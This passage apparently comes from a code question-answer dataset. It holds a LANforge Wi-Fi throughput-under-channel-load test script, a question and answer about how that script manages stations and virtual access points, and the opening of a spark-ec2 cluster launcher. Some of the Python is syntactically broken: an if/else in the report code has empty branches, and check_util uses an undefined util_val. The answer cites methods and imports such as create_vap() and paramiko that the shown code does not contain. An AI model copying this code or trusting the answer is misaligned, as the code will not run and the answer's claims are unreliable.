len(bps_rx_b[index])):.2f} | Total: {sum(bps_rx_b[index]):.2f}')\r\n                if thrp_b:\r\n                    print(f\"Expected throughput for util-{util[index]} and threshold-{threshold[index]}---- \"\r\n                          f\"{(thrp_b / 100) * (int(threshold[index]))} \\nGot overall upload values for util \"\r\n                          f\"'{util[index]}'----- {sum(bps_rx_b[index])} \\n \")\r\n                    if (thrp_b / 100) * int(threshold[index]) <= sum(bps_rx_b[index]) and min(bps_rx_b[index])!= 0:\r\n                    else:\r\n            else:\r\n                pas_fail_up.append(\"NA\")\r\n                rx_b.append(0)\r\n\r\n            util[index] = f'{util[index]}%'  # append % to the util values\r\n\r\n        overall_tab = pd.DataFrame({\r\n            'Channel Utilization (%)': util, \"No.of.clients\": [len(sta_num)] * len(util),\r\n            'Intended Throughput(Mbps)': [f'upload: {upload} | download: {download}'] * len(util),\r\n            'Achieved Upload Throughput(Mbps)': rx_b, 'Achieved Download Throughput(Mbps)': rx_a\r\n        })\r\n        print(f\"overall table \\n{overall_tab}\")\r\n\r\n        pasfail_tab = pd.DataFrame({\r\n            'Channel Utilization (%)': util,\r\n            'Upload': pas_fail_up,\r\n            'Download': pas_fail_down\r\n        })\r\n        print(f\"pass-fail table \\n {pasfail_tab}\")\r\n        report = lf_report(_results_dir_name=\"Throughput_Under_Channel_Load\",_output_html=\"throughput_channel_load.html\",\r\n                           _output_pdf=\"throughput_channel_load.pdf\")\r\n        report.set_title(rep_title)\r\n        report.build_banner()\r\n        report.set_obj_html(_obj_title=\"Objective\",\r\n                            _obj=f\"This test is designed to measure the throughput of {len(sta_num)} clients connected on 5GHz\"\r\n                                 \" radio when the channel was already utilized with different percentage\")\r\n        report.build_objective()\r\n        # test setup information\r\n        report.set_table_title(\"Test Setup Information\")\r\n        report.build_table_title()\r\n        report.test_setup_table(test_setup_data=test_setup_info, value=\"Device Under Test\")\r\n        self.table(report, \"Min, Max, Avg Throughput\", overall_tab,\r\n              dis=f\"The below table gives the information about Min, Max, and Avg throughput \"\r\n                  f\"for the clients when channel utilized with {', '.join(util)}\")\r\n        self.table(report, \"Pass/Fail Criteria\", pasfail_tab, dis=f\"This table briefs about Pass/Fail criteria  \"\r\n             f\"for {', '.join(util)} channel utilization. If all the stations are able to run traffic and the overall throughput \"\r\n             f\"should meet the given threshold then the test is considered to be PASS. The test fails if the overall throughput \"\r\n            f\"is below the threshold value also if any one of the station is not able to run the layer-3 traffic.\")\r\n        if download:\r\n            self.grph(report,\r\n                 data_set=[[min(i) for i in bps_rx_a], [max(i) for i in bps_rx_a], [sum(i) / len(i) for i in bps_rx_a]],\r\n                 dis=f\"This graph represents the minimum, maximum and average throughput of \"\r\n                     f\"stations when channel was utilized with {', '.join(util)} for download traffic\",\r\n                 xaxis_name=\"Utilizations\", yaxis_name=\"Throughput (Mbps)\",\r\n                 xaxis_categories=util, label=[\"min\", \"max\", 'avg'],multi_bar_width = 0.25,\r\n                 graph_image_name=\"Download Throughput for all channel utilizations\",step=1)\r\n        if upload:\r\n            self.grph(report,\r\n                 data_set=[[min(i) for i in bps_rx_b], [max(i) for i in bps_rx_b], [sum(i) / len(i) for i in bps_rx_b]],\r\n                 dis=f\"This graph represents the minimum, maximum and average throughput of \"\r\n                     f\"stations when channel was utilized with {', '.join(util)} for upload traffic\",\r\n                 xaxis_name=\"Utilizations\", yaxis_name=\"Throughput (Mbps)\",\r\n                 xaxis_categories=util, label=[\"min\", \"max\", 'avg'],multi_bar_width = 0.25,\r\n                 graph_image_name=\"Upload Throughput for all channel utilization\",step= 1)\r\n        if len(sta_num) <= 40:\r\n            step = 1\r\n        elif 40 < len(sta_num) <= 80:\r\n            step = 3\r\n        elif 80 < len(sta_num) <= 100:\r\n            step = 5\r\n        else:\r\n            step = 10\r\n        for i in range(len(util)):\r\n            if download:\r\n                self.grph(report, data_set=[bps_rx_a[i]],\r\n                     dis=f\"The graph shows the individual throughput for all the connected stations on 5GHz radio \"\r\n                         f\"when channel was utilized with {util[i]} in download traffic\",\r\n                     xaxis_name=\"Stations\",yaxis_name=\"Throughput (Mbps)\", xaxis_categories=range(1, len(sta_num) + 1,step),\r\n                     label=[util[i]], graph_image_name=f\"Individual download throughput - CH{util[i]}\", xticks_font=7,step = step\r\n                   ,multi_bar_width = 0)\r\n            if upload:\r\n                self.grph(report, data_set=[bps_rx_b[i]],\r\n                     dis=f\"The graph shows the individual throughput for all the connected stations on 5GHz radio \"\r\n                         f\"when channel was utilized with {util[i]} in upload traffic\",\r\n                     xaxis_name=\"stations\", yaxis_name=\"Throughput (Mbps)\", xaxis_categories=range(1, len(sta_num) + 1,step),\r\n                     label=[util[i]], graph_image_name=f\"Individual upload throughput - CH{util[i]}\", xticks_font=7,step = step\r\n                   ,multi_bar_width = 0)\r\n        # input setup information\r\n        report.set_table_title(\"Input Setup Information\")\r\n        report.build_table_title()\r\n        report.test_setup_table(test_setup_data=input_setup_info, value=\"Information\")\r\n        report.build_footer()\r\n        html_file = report.write_html()\r\n        logger.info(\"returned file {}\".format(html_file))\r\n        logger.info(html_file)\r\n        report.write_pdf()\r\n        colmn.extend(range(1, len(self.bps_rx) + 1))\r\n        data = list(self.bps_rx.values())\r\n        data.insert(0, self.sta_list)\r\n        csv = self.generates_csv(_columns= colmn, _rows= data,\r\n                                 _filename='throughput_under_channel_load.csv')\r\n        csv.generate_csv()\r\n        report.csv_file_name = \"throughput_under_channel_load.csv\"\r\n        report.move_csv_file()\r\n\r\n    def monitor(self, duration_sec, monitor_interval, created_cx, col_names, iterations):\r\n        try:\r\n            duration_sec = Realm.parse_time(duration_sec).seconds\r\n        except:\r\n            if (duration_sec is None) or (duration_sec <= 1):\r\n                raise ValueError(\"L3CXProfile::monitor wants duration_sec > 1 second\")\r\n            if (duration_sec <= monitor_interval):\r\n                raise ValueError(\"L3CXProfile::monitor wants duration_sec > monitor_interval\")\r\n        if created_cx == None:\r\n            raise ValueError(\"Monitor needs a list of Layer 3 connections\")\r\n        if (monitor_interval is None) or (monitor_interval < 1):\r\n            raise ValueError(\"L3CXProfile::monitor wants monitor_interval >= 1 second\")\r\n\r\n        start_time = datetime.datetime.now()\r\n        end_time = start_time + datetime.timedelta(seconds=duration_sec)\r\n        # bps-rx-a (download) and bps-rx-b(upload) values are taken\r\n        self.bps_rx_a, self.bps_rx_b, self.bps_rx, index = [], [], {}, -1\r\n        bps_rx_a_avg,bps_rx_b_avg = [],[]\r\n        [(self.bps_rx_a.append([]), self.bps_rx_b.append([])) for i in range(len(created_cx))]\r\n        for test in range(1 + iterations):\r\n            while datetime.datetime.now() < end_time:\r\n                index += 1\r\n                response = list(self.json_get('/cx/%s?fields=%s' % (','.join(created_cx),\",\".join(col_names))).values())[2:]\r\n                self.bps_rx[index] = list(map(lambda i: [float(f\"{x / (1000000):.2f}\") for x in i.values()],response))\r\n                time.sleep(monitor_interval)\r\n        print(\"rx rate values are with [bps-rx-a, bps-rx-b] :-\\n\", self.bps_rx,\"\\n\\n\")\r\n        for index, key in enumerate(self.bps_rx):\r\n            for i in range(len(self.bps_rx[key])):\r\n                if self.cx_profile.side_b_min_bps!= '0' and self.cx_profile.side_b_min_bps!= 0:\r\n                    self.bps_rx_a[i].append(self.bps_rx[key][i][0])\r\n                if self.cx_profile.side_a_min_bps!= '0' and self.cx_profile.side_a_min_bps!= 0:\r\n                    self.bps_rx_b[i].append(self.bps_rx[key][i][1])\r\n        print(f\"bps-rx-a values-: \\n{self.bps_rx_a}\\nbps-rx-b values-: \\n{self.bps_rx_b}\")\r\n        if self.cx_profile.side_a_min_bps!= '0' and self.cx_profile.side_a_min_bps!= 0:\r\n            bps_rx_b_avg = [float(f\"{sum(i) / len(i):.2f}\") for i in self.bps_rx_b]\r\n        if self.cx_profile.side_b_min_bps!= '0' and self.cx_profile.side_b_min_bps!= 0:\r\n            bps_rx_a_avg = [float(f\"{sum(i) / len(i):.2f}\") for i in self.bps_rx_a]\r\n        return bps_rx_a_avg,bps_rx_b_avg\r\n\r\n    def check_util(self,real_cli_obj = None, util_list = None, real_cli = None,\r\n                   ssh_root = None, ssh_passwd = None,test_time = 0,up_down = [0],threshold=None,channnel=0):\r\n        bps_rx_a,bps_rx_b,sta_create,count = [],[],1,0\r\n        for util in util_list:  #  get throughput for every utilization values\r\n            if count > 0:\r\n                if len(up_down) > 0: # give data rate value and delete aggigned\r\n                    self.cx_profile.side_a_min_bps, self.cx_profile.side_b_min_bps = int(float(up_down[0])),int(float( up_down[0]))\r\n                    up_down.pop(0)\r\n            count += 1\r\n            stop_channel_load = 0\r\n            util_flag = 1\r\n            '''Loop until the expected channel utilization will get'''\r\n            while util_flag:\r\n                stop_channel_load += 1\r\n                '''STOP the script if unable to set the utilization for 20 times'''\r\n                if stop_channel_load >= 20:\r\n                    print(f\"Tried loading the channel with {util}% for {stop_channel_load} times...\\n\"\r\n                          f\"Unable to load the channel with {util}%\\nScript exiting...\")\r\n                    exit(1)\r\n\r\n                if (util - 3) <= util_val <= (util + 3):\r\n                    util_flag = 0\r\n                    if sta_create:\r\n                        sta_create = 0\r\n                    real_cli_obj.start(False, False)\r\n                    time.sleep(20)\r\n                    _bps_rx_a, _bps_rx_b = real_cli_obj.monitor(duration_sec=float(self.test_duration) * 60, monitor_interval=1,\r\n                                 created_cx=real_cli_obj.cx_profile.created_cx.keys(),\r\n                                 col_names=['bps rx a', 'bps rx b'], iterations=0)\r\n                    bps_rx_a.append(_bps_rx_a)\r\n                    bps_rx_b.append(_bps_rx_b)\r\n                    real_cli_obj.stop(trf=True,ad_dwn=False)\r\n                else:\r\n                    if util_val < (util - 3):\r\n                        logger.info(\"less than {}% util...\".format(util))\r\n                        if ((util ) - util_val) <= 4:\r\n                            self.re_run_traff(100000, \"add\")\r\n                        elif ((util ) - util_val) <= 8:\r\n                            self.re_run_traff(300000, \"add\")\r\n                        elif ((util ) - util_val) <= 12:\r\n                            self.re_run_traff(500000, \"add\")\r\n                        elif (util ) - util_val <= 16:\r\n                            self.re_run_traff(1000000, \"add\")\r\n                        elif (util ) - util_val > 16:\r\n                            self.re_run_traff(1500000, \"add\")\r\n\r\n                    elif util_val > (util + 3):\r\n                        logger.info(\"greater than {}% util...\".format(util))\r\n                        if (util_val - (util )) <= 4:\r\n                            self.re_run_traff(100000, \"sub\")\r\n                        elif (util_val - (util )) <= 8:\r\n                            self.re_run_traff(300000, \"sub\")\r\n                        elif (util_val - (util )) <= 12:\r\n                            self.re_run_traff(500000, \"sub\")\r\n                        elif util_val - (util ) <= 16:\r\n                            self.re_run_traff(1000000, \"sub\")\r\n                        elif util_val - (util ) > 16:\r\n                            self.re_run_traff(1500000, \"sub\")\r\n\r\n        print(f\"bps_rx_a {bps_rx_a}\\nbps_rx_b {bps_rx_b}\")\r\n\r\n        test_end = datetime.datetime.now().strftime(\"%b %d %H:%M:%S\")\r\n        logger.info(\"Test ended at %s\", test_end)\r\n\r\n        if len(threshold) < len(util_list):\r\n            for i in range(len(util_list)):\r\n                try:\r\n                    tmp = threshold[i]\r\n                except IndexError as e:\r\n                    print(f\"Threshold {threshold} and utilization {util_list}\")\r\n                    threshold.append(100 - int(util_list[i]))\r\n        print(f\"threshold {threshold} and utilization {util_list}\")\r\n        test_setup_info = {\r\n            \"AP Name\": self.ap,\r\n            \"SSID\": real_cli_obj.ssid,\r\n            'No.of stations': len(real_cli),\r\n            'Vap channel': channnel,\r\n            'Utilization': ', '.join(map(str,util_list)),\r\n            'Threshold': ', '.join(map(str,threshold)),\r\n            \"Total Test Duration\": datetime.datetime.strptime(test_end, '%b %d %H:%M:%S') - datetime.datetime.strptime(test_time, '%b %d %H:%M:%S')\r\n        }\r\n\r\n        input_setup_info = {\r\n            \"Contact\": \"support@candelatech.com\"\r\n        }\r\n        real_cli_obj.report(util = util_list, sta_num = real_cli,\r\n                                    bps_rx_a = bps_rx_a, bps_rx_b= bps_rx_b,\r\n                                    rep_title = \"Throughput Under Channel Load\",\r\n                                    upload = int(real_cli_obj.cx_profile.side_a_min_bps)/1000000,\r\n                                    download = int(real_cli_obj.cx_profile.side_b_min_bps)/1000000,\r\n                                    test_setup_info = test_setup_info,input_setup_info = input_setup_info,threshold= threshold)\r\n\r\n\r\ndef main():\r\n    try:\r\n        optional,required = [],[]\r\n        optional.append({'name': '--mode', 'help': 'Used to force mode of stations','default': 9})\r\n        optional.append({'name': '--ap_name', 'help': 'AP name'})\r\n        required.append({'name': '--ap_ip', 'help': 'IP of AP which was connected'})\r\n        optional.append({'name': '--test_duration', 'help': 'Sets the duration of the test in minutes', 'default': 1})\r\n        optional.append({'name':'--vap_channel', 'help':'To create VAP provide the AP channel', 'default': 36})\r\n        required.append({'name':'--vap_radio', 'help':'VAP radio', 'default': \"wiphy3\"})\r\n        optional.append({'name':'--util', 'help':'Channel utilization(provide whole number eg: 11,23,30,etc) with data_rate(bps) for that utilization',\r\n                         'default': \"20-3000000,40-6000000\"})\r\n        optional.append({'name':'--threshold', 'help':'Set the threshold for each utilization. '\r\n                          'By default it will take 100-util_value (eg: 100-20=80) in case user not providing the Threshold'})\r\n        required.append({'name':'--ap_password','help':'Password for AP'})\r\n        optional.append({'name': '--upload', 'help': 'Upload bps rate minimum for side_a of netgear', 'default': 0})\r\n        optional.append({'name': '--download', 'help': 'Download bps rate minimum for side_b of netgear', 'default': 0})\r\n        parser = Realm.create_basic_argparse(\r\n            prog='throughput.py',\r\n            formatter_class=argparse.RawTextHelpFormatter,\r\n            epilog='''\\\r\n                Measure the throughput for no.of clients when the channel was already utilized by specific load\r\n                ''',\r\n            description='''\\\r\n    throughput.py:\r\n    --------------------\r\n    Generic command layout:\r\n    Note:- \r\n    **** In case user providing 'Fractional part' to the input values while running, the script will automatically truncate \r\n    the Fractional part except the test_duration.\r\n    **** The script will automatically stop its execution when the channel is unable to load.\r\n    python3./throughput.py\r\n        --mode 1 {\"auto\"   : \"0\",\r\n            \"a\"      : \"1\",\r\n            \"b\"      : \"2\",\r\n            \"g\"      : \"3\",\r\n            \"abg\"    : \"4\",\r\n            \"abgn\"   : \"5\",\r\n            \"bgn\"    : \"6\",\r\n            \"bg\"     : \"7\",\r\n            \"abgnAC\" : \"8\",\r\n            \"anAC\"   : \"9\",\r\n            \"an\"     : \"10\",\r\n            \"bgnAC\"  : \"11\",\r\n            \"abgnAX\" : \"12\",\r\n            \"bgnAX\"  : \"13\"}\r\n        --upstream_port eth1\r\n        --vap_radio wiphy0\r\n        --vap_channel 36\r\n        --radio wiphy1\r\n        --num_stations 40\r\n        --security {open|wep|wpa|wpa2|wpa3}\r\n        --ssid netgear\r\n        --password admin123\r\n        --test_duration 1 (default)\r\n        --upload 3000000\r\n        --download 3000000\r\n        --util 20-2000000,40-000000\r\n        --threshold 80,50\r\n        --ap_ip 192.168.208.22\r\n        --ap_name WAC505\r\n        --ap_password Password@123xzsawq@!\r\n        --debug\r\n    ===============================================================================\r\n        ''', more_optional=optional, more_required = required)\r\n\r\n        args = parser.parse_args()\r\n\r\n        # set up logger\r\n        logger_config = lf_logger_config.lf_logger_config()\r\n        if args.lf_logger_config_json:\r\n            logger_config.lf_logger_config_json = args.lf_logger_config_json\r\n            logger_config.load_lf_logger_config()\r\n\r\n        bridge_list = \"br0\"\r\n        create_bridge = CreateBridge(_host=args.mgr,\r\n                            _port=args.mgr_port,\r\n                            _bridge_list=bridge_list,\r\n                            _debug_on=args.debug,\r\n                            target_device=args.target_device)\r\n\r\n        util_rate = args.util.split(',')\r\n        if args.threshold!= None:\r\n            threshold = [int(float(i)) for i in args.threshold.split(',')]\r\n        else:\r\n            threshold = []\r\n        util_list, rate_list = [],[]\r\n        for i in range(len(util_rate)):\r\n            util_list.append(util_rate[i].split('-')[0])\r\n            rate_list.append(util_rate[i].split('-')[1])\r\n        util_list = [int(float(i)) for i in util_list]\r\n\r\n        station_list = LFUtils.portNameSeries(prefix_=\"sta\", start_id_=0, end_id_= 3, padding_number_=10000, radio=args.radio)\r\n        # vap name\r\n        vap_name = 'vap0000'\r\n        print(\"List of stations under VAP--\",station_list,'\\nVAP name--',vap_name)\r\n        vap_sta_upload, vap_sta_download = int(float(rate_list[0])), int(float(rate_list[0]))\r\n        rate_list.pop(0)\r\n\r\n        ip_var_test = IPV4VariableTime(host=args.mgr,           port=args.mgr_port,         number_template=\"0000\",\r\n                                       sta_list=station_list,   name_prefix=\"VT\",           upstream=vap_name,\r\n                                       ssid=\"vap_ssid\",          password='[BLANK]',       radio=args.radio,\r\n                                       security='open',         test_duration=args.test_duration,\r\n                                       use_ht160=False,         side_a_min_rate= vap_sta_upload,\r\n                                       side_b_min_rate=vap_sta_download,\r\n                                       mode=args.mode,          ap=args.ap_name,                 _debug_on=args.debug,\r\n                                       _vap_list = vap_name, _vap_radio = args.vap_radio, _dhcp = False)\r\n\r\n        # ip_var_test.stop()\r\n        # time.sleep(30)\r\n        # test_time = datetime.datetime.now().strftime(\"%b %d %H:%M:%S\")\r\n        test_time = datetime.now().strftime(\"%b %d %H:%M:%S\")\r\n        logger.info(\"Test started at %s\", test_time)\r\n\r\n        ip_var_test.build_vaps(chn = int(float(args.vap_channel)))  # create VAPs\r\n        ip_var_test.build()     # create Stations and traffic\r\n\r\n        if not ip_var_test.passes():\r\n            logger.info(ip_var_test.get_fail_message())\r\n            ip_var_test.exit_fail()\r\n\r\n        try:\r\n            layer3connections = ','.join([[*x.keys()][0] for x in ip_var_test.json_get('endp')['endpoint']])\r\n        except:\r\n            raise ValueError('Try setting the upstream port flag if your device does not have an eth1 port')\r\n\r\n\r\n        station_list1 = LFUtils.portNameSeries(prefix_=\"Thsta\", start_id_=0, end_id_=int(num_sta(args.num_stations))-1, padding_number_=10000,\r\n                                               radio=args.radio)\r\n        logger.info(\"Station list for netgear AP.....\\n%s\", station_list1)\r\n        ip_var_test1 = IPV4VariableTime(host=args.mgr,          port=args.mgr_port,         number_template=\"0000\",\r\n                                        sta_list=station_list1, name_prefix=\"Thrp\",         upstream=args.upstream_port,\r\n                                        ssid= args.ssid,   password=args.passwd,       radio=args.radio,\r\n                                        security=args.security,                    test_duration=args.test_duration,\r\n                                        use_ht160=False,      side_a_min_rate=int(float(args.upload)),    side_b_min_rate=int(float(args.download)),\r\n                                        mode=args.mode,       ap=args.ap_name,             _debug_on=args.debug,   _dhcp = True)\r\n\r\n        ip_var_test.check_util(real_cli_obj = ip_var_test1, util_list = util_list,real_cli = station_list1, ssh_root = args.ap_ip,\r\n           ssh_passwd = args.ap_password,test_time = test_time, up_down=rate_list,threshold = threshold,channnel = int(float(args.vap_channel)))\r\n\r\n        if not ip_var_test.passes():\r\n            logger.info(ip_var_test.get_fail_message())\r\n            ip_var_test.exit_fail()\r\n\r\n        if ip_var_test.passes():\r\n            ip_var_test.exit_success()\r\n\r\n    except Exception as e:\r\n        '''\r\n                      \"OR Re-run the script if the script stopped by some unexpected behavior..\", e)\r\n        '''\r\n        logger.info(\"### %s ###\", e)\r\n        logger.info(\"Unable to run the script...\")\r\n        logger.info(\"Provide the right values with the help of --help command\")\r\n        logger.info(\"OR Re-run the script if the script stopped by some unexpected behavior..\")\r\n        logger.info(traceback.format_exc())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()", "question": " How does the Python script manage network devices such as stations, interfaces, and virtual access points?", "answer": "\n        The Python script manages network devices such as stations, interfaces, and virtual access points using the following features:\n\n1. It imports necessary modules like paramiko, argparse, pprint, logging, etc to interact with network devices.\n\n2. It uses IPV4VariableTime class to define network devices like stations, interfaces, virtual access points and manage them.\n\n3. It uses methods like start(), stop(), build(), monitor() to create and manage network devices. \n\n4. For virtual access points, it creates them using the create_vap() method.\n\n5. It uses importlib to import required modules like py-json.LANforge, py-json.LANforge.lfcli_base, etc to manage devices.\n\n6. It uses logging and traceback to manage any errors or unexpected behavior.\n\n7. The script allows user to provide values like test duration, number of stations, virtual access point channel, etc to customize the network setup.\n\nIn summary, the script uses various modules and methods to create, manage and test network devices like stations, interfaces, and virtual access points."}
{"text": "# language: Python\n#!/usr/bin/env python\n\n\nfrom __future__ import division, print_function, with_statement\n\nimport codecs\nimport hashlib\nimport itertools\nimport logging\nimport os\nimport os.path\nimport pipes\nimport random\nimport shutil\nimport string\nfrom string import Template\nfrom stat import S_IRUSR\nimport subprocess\nimport sys\nimport tarfile\nimport tempfile\nimport textwrap\nimport time\nimport warnings\nfrom datetime import datetime\nfrom optparse import OptionParser\nfrom sys import stderr\nimport datetime\nfrom datetime import datetime\nfrom datetime import timedelta\n\nif sys.version < \"3\":\n  from urllib2 import urlopen, Request, HTTPError\nelse:\n  from urllib.request import urlopen, Request\n  from urllib.error import HTTPError\n  raw_input = input\n  xrange = range\n\n\nSPARK_EC2_VERSION = \"2.1.2\"\nDEFAULT_SPARK_VERSION=SPARK_EC2_VERSION\nSPARK_EC2_DIR = \"/opt/spark\"\n\nVALID_SPARK_VERSIONS = set([\n    \"0.7.3\",\n    \"0.8.0\",\n    \"0.8.1\",\n    \"0.9.0\",\n    \"0.9.1\",\n    \"0.9.2\",\n    \"1.0.0\",\n    \"1.0.1\",\n    \"1.0.2\",\n    \"1.1.0\",\n    \"1.1.1\",\n    \"1.2.0\",\n    \"1.2.1\",\n    \"1.3.0\",\n    \"1.3.1\",\n    \"1.4.0\",\n    \"1.4.1\",\n    \"1.5.0\",\n    \"1.5.1\",\n    \"1.5.2\",\n    \"1.6.0\",\n    \"1.6.1\",\n    \"1.6.2\",\n    \"1.6.3\",\n    \"2.0.0-preview\",\n    \"2.0.0\",\n    \"2.0.1\",\n    \"2.0.2\",\n    \"2.1.0\",\n    \"2.1.2\"\n])\n\nSPARK_TACHYON_MAP = {\n    \"1.0.0\": \"0.4.1\",\n    \"1.0.1\": \"0.4.1\",\n    \"1.0.2\": \"0.4.1\",\n    \"1.1.0\": \"0.5.0\",\n    \"1.1.1\": \"0.5.0\",\n    \"1.2.0\": \"0.5.0\",\n    \"1.2.1\": \"0.5.0\",\n    \"1.3.0\": \"0.5.0\",\n    \"1.3.1\": \"0.5.0\",\n    \"1.4.0\": \"0.6.4\",\n    \"1.4.1\": \"0.6.4\",\n    \"1.5.0\": \"0.7.1\",\n    \"1.5.1\": \"0.7.1\",\n    \"1.5.2\": \"0.7.1\",\n    \"1.6.0\": \"0.8.2\",\n    \"1.6.1\": \"0.8.2\",\n    \"1.6.2\": \"0.8.2\",\n    \"2.0.0-preview\": \"\",\n}\n\n\nDEFAULT_SPARK_GITHUB_REPO = \"https://github.com/apache/spark\"\n\nDEFAULT_SPARK_EC2_GITHUB_REPO = \"https://github.com/paulomagalhaes/spark-ec2\"\nDEFAULT_SPARK_EC2_BRANCH = \"branch-2.1\"\n\ndef setup_external_libs(libs):\n  \"\"\"\n  Download external libraries from PyPI to SPARK_EC2_DIR/lib/ and prepend them to our PATH.\n  \"\"\"\n  PYPI_URL_PREFIX = \"https://pypi.python.org/packages/source\"\n  SPARK_EC2_LIB_DIR = os.path.join(SPARK_EC2_DIR, \"lib\")\n\n  if not os.path.exists(SPARK_EC2_LIB_DIR):\n    print(\"Downloading external libraries that spark-ec2 needs from PyPI to {path}...\".format(\n      path=SPARK_EC2_LIB_DIR\n    ))\n    print(\"This should be a one-time operation.\")\n    os.mkdir(SPARK_EC2_LIB_DIR)\n\n  for lib in libs:\n    versioned_lib_name = \"{n}-{v}\".format(n=lib[\"name\"], v=lib[\"version\"])\n    lib_dir = os.path.join(SPARK_EC2_LIB_DIR, versioned_lib_name)\n\n    if not os.path.isdir(lib_dir):\n      tgz_file_path = os.path.join(SPARK_EC2_LIB_DIR, versioned_lib_name + \".tar.gz\")\n      print(\" - Downloading {lib}...\".format(lib=lib[\"name\"]))\n      download_stream = urlopen(\n        \"{prefix}/{first_letter}/{lib_name}/{lib_name}-{lib_version}.tar.gz\".format(\n          prefix=PYPI_URL_PREFIX,\n          first_letter=lib[\"name\"][:1],\n          lib_name=lib[\"name\"],\n          lib_version=lib[\"version\"]\n        )\n      )\n      with open(tgz_file_path, \"wb\") as tgz_file:\n        tgz_file.write(download_stream.read())\n      with open(tgz_file_path) as tar:\n        if hashlib.md5(tar.read()).hexdigest()!= lib[\"md5\"]:\n          print(\"ERROR: Got wrong md5sum for {lib}.\".format(lib=lib[\"name\"]), file=stderr)\n          sys.exit(1)\n      tar = tarfile.open(tgz_file_path)\n      tar.extractall(path=SPARK_EC2_LIB_DIR)\n      tar.close()\n      os.remove(tgz_file_path)\n      print(\" - Finished downloading {lib}.\".format(lib=lib[\"name\"]))\n    sys.path.insert(1, lib_dir)\n\n\n# Only PyPI libraries are supported.\nexternal_libs = [\n  {\n    \"name\": \"boto\",\n    \"version\": \"2.34.0\",\n    \"md5\": \"5556223d2d0cc4d06dd4829e671dcecd\"\n  }\n]\n\nsetup_external_libs(external_libs)\n\nimport boto\nfrom boto.ec2.blockdevicemapping import BlockDeviceMapping, BlockDeviceType, EBSBlockDeviceType\nfrom boto import ec2\n\nclass UsageError(Exception):\n  pass\n\n\ndef parse_args():\n  parser = OptionParser(usage=\"spark-ec2 [options] <action> <cluster_name>\"\n      + \"\\n\\n<action> can be: launch, destroy, login, stop, start, get-master\",\n      add_help_option=False)\n  parser.add_option(\"-h\", \"--help\", action=\"help\",\n                    help=\"Show this help message and exit\")\n  parser.add_option(\"-s\", \"--slaves\", type=\"int\", default=1,\n      help=\"Number of slaves to launch (default: 1)\")\n  parser.add_option(\"-w\", \"--wait\", type=\"int\", default=120,\n      help=\"Seconds to wait for nodes to start (default: 120)\")\n  parser.add_option(\"-k\", \"--key-pair\",\n      help=\"Key pair to use on instances\")\n  parser.add_option(\"-i\", \"--identity-file\",\n      help=\"SSH private key file to use for logging into instances\")\n  parser.add_option(\"-t\", \"--instance-type\", default=\"m1.large\",\n      help=\"Type of instance to launch (default: m1.large). \" +\n           \"WARNING: must be 64-bit; small instances won't work\")\n  parser.add_option(\"-m\", \"--master-instance-type\", default=\"\",\n      help=\"Master instance type (leave empty for same as instance-type)\")\n  parser.add_option(\"-r\", \"--region\", help=\"EC2 region zone to launch instances in\")\n  parser.add_option(\"-z\", \"--zone\", help=\"Availability zone to launch instances in, or 'all' to spread \" +\n           \"slaves across multiple (an additional $0.01/Gb for bandwidth\" +\n           \"between zones applies)\")\n  parser.add_option(\"-a\", \"--ami\", help=\"Amazon Machine Image ID to use\")\n  parser.add_option(\"-p\", \"--profile\", help=\"AWS profile/role arn to use\")\n  parser.add_option(\"-v\", \"--spark-version\", default=DEFAULT_SPARK_VERSION,\n      help=\"Version of Spark to use: 'X.Y.Z' or a specific git hash\")\n  parser.add_option(\"--spark-git-repo\",\n      default=\"https://github.com/apache/spark\",\n      help=\"Github repo from which to checkout supplied commit hash\")\n  parser.add_option(\"--hadoop-major-version\", default=\"2\",\n      help=\"Major version of Hadoop (default: 2)\")\n  parser.add_option(\"-D\", metavar=\"[ADDRESS:]PORT\", dest=\"proxy_port\",\n      help=\"Use SSH dynamic port forwarding to create a SOCKS proxy at \" +\n            \"the given local address (for use with login)\")\n  parser.add_option(\"--resume\", action=\"store_true\", default=False,\n      help=\"Resume installation on a previously launched cluster \" +\n           \"(for debugging)\")\n  parser.add_option(\"--ebs-vol-size\", metavar=\"SIZE\", type=\"int\", default=0,\n      help=\"Attach a new EBS volume of size SIZE (in GB) to each node as \" +\n           \"/vol. The volumes will be deleted when the instances terminate. \" +\n           \"Only possible on EBS-backed AMIs.\")\n  parser.add_option(\"--swap\", metavar=\"SWAP\", type=\"int\", default=1024,\n      help=\"Swap space to set up per node, in MB (default: 1024)\")\n  parser.add_option(\"--spot-price\", metavar=\"PRICE\", type=\"float\",\n      help=\"If specified, launch slaves as spot instances with the given \" +\n            \"maximum price (in dollars)\")\n  parser.add_option(\"--ganglia\", action=\"store_true\", default=True,\n      help=\"Setup Ganglia monitoring on cluster (default: on). NOTE: \" +\n           \"the Ganglia page will be publicly accessible\")\n  parser.add_option(\"--no-ganglia\", action=\"store_false\", dest=\"ganglia\",\n      help=\"Disable Ganglia monitoring for the cluster\")\n  parser.add_option(\"-u\", \"--user\", default=\"root\",\n      help=\"The SSH user you want to connect as (default: root)\")\n  parser.add_option(\"--delete-groups\", action=\"store_true\", default=False,\n      help=\"When destroying a cluster, delete the security groups that were created\")\n  parser.add_option(\"--use-existing-master\", action=\"store_true\", default=False,\n      help=\"Launch fresh slaves, but use an existing stopped master if possible\")\n  parser.add_option(\"--worker-instances\", type=\"int\", default=1,\n      help=\"Number of instances per worker: variable SPARK_WORKER_INSTANCES (default: 1)\")\n  parser.add_option(\"--master-opts\", type=\"string\", default=\"\",\n      help=\"Extra options to give to master through SPARK_MASTER_OPTS variable (e.g -Dspark.worker.timeout=180)\")\n\n  (opts, args) = parser.parse_args()\n  if len(args)!= 2:\n    parser.print_help()\n    sys.exit(1)\n  (action, cluster_name) = args\n\n  if opts.region is None:\n    opts.region = region()\n\n  if opts.zone is None:\n    opts.zone = zone()\n\n  return (opts, action, cluster_name)\n\n\ndef get_or_make_group(conn, name):\n  groups = conn.get_all_security_groups()\n  group = [g for g in groups if g.name == name]\n  if len(group) > 0:\n    return group[0]\n  else:\n    print( \"Creating security group \" + name)\n    return conn.create_security_group(name, \"Spark EC2 group\")\n\n\ndef wait_for_instances(conn, instances):\n  ids = [i.id for i in instances]\n  while True:\n    instace_stati = conn.get_all_instance_status(instance_ids=ids)\n    if len([i for i in instace_stati if i.system_status.details['reachability']!= 'passed' or i.instance_status.details['reachability']!= 'passed']) > 0:\n        time.sleep(5)\n    else:\n      return\n\n\ndef is_active(instance):\n  return (instance.state in ['pending', 'running','stopping','stopped'])\n\ndef get_validate_spark_version(version, repo):\n    if \".\" in version:\n        version = version.replace(\"v\", \"\")\n        if version not in VALID_SPARK_VERSIONS:\n            print(\"Don't know about 